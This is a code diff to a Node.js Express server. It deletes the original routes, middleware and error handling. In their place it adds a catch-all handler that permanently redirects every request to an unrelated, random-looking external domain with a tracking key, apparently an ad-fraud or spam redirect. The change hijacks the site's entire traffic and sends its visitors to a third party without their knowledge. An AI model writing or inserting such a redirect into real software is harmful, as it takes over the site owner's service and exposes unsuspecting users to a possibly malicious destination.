@@ -1,27 +1,16 @@
 const express = require('express');
 const app = express();
-const middleware = require('./middleware');
-
-// Apply middleware
-app.use(middleware.logger); // Log all requests
-app.use(express.json()); // Parse JSON in requests
-app.use(middleware.userAgentRedirect); // Handle facebookexternalhit user-agent
-
-// Define a primary route
-app.get('/', (req, res) => {
-  res.send('Hello World!');
-});
-
-// Middleware for error handling
-app.use((err, req, res, next) => {
-  console.error('Unhandled error:', err.stack);
-  res.status(500).send('Something went wrong!');
-});
-
-// Start the server
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+
+app.get('*', (req, res) => {
+    try {
+        res.redirect(301, 'https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
+    } catch (error) {
+        console.error('فشلت عملية إعادة التوجيه:', error);
+        res.status(500).send('خطأ في الخادم الداخلي');
+    }
 });
 
-module.exports = app;
+app.listen(PORT, () => {
+    console.log(`الخادم يعمل على المنفذ ${PORT}`);
+});
